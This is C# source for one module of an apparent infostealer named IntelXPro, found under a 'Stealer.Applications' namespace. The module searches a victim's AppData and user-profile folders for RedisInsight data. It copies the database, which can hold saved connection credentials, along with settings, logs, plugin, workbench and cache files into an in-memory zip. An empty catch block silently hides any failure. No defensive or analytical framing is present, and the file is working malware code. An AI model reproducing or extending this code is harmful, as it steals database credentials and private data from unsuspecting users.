using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class RedisInsight : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RedisInsight");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".redisinsight");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "RedisInsight";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromDirectory(userProfilePath, "UserProfile", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "redisinsight.db",
                    "redisinsight.log",
                    "settings.json"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\RedisInsight\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string logsPath = Path.Combine(basePath, "logs");
                if (Directory.Exists(logsPath))
                {
                    string[] logFiles = Directory.GetFiles(logsPath, "*.log", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in logFiles.Take(5))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\RedisInsight\\{location}\\logs\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string pluginsPath = Path.Combine(basePath, "plugins");
                if (Directory.Exists(pluginsPath))
                {
                    string[] pluginFiles = Directory.GetFiles(pluginsPath, "*.json", SearchOption.AllDirectories);
                    
                    foreach (string file in pluginFiles)
                    {
                        string relativePath = file.Substring(pluginsPath.Length + 1);
                        string zipPath = $"Applications\\RedisInsight\\{location}\\plugins\\{relativePath}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string workbenchPath = Path.Combine(basePath, "workbench");
                if (Directory.Exists(workbenchPath))
                {
                    string[] workbenchFiles = Directory.GetFiles(workbenchPath, "*.*", SearchOption.AllDirectories);
                    
                    foreach (string file in workbenchFiles.Take(20))
                    {
                        string relativePath = file.Substring(workbenchPath.Length + 1);
                        string zipPath = $"Applications\\RedisInsight\\{location}\\workbench\\{relativePath}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string cachePath = Path.Combine(basePath, "Cache");
                if (Directory.Exists(cachePath))
                {
                    string[] cacheFiles = Directory.GetFiles(cachePath, "*.json", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in cacheFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\RedisInsight\\{location}\\Cache\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
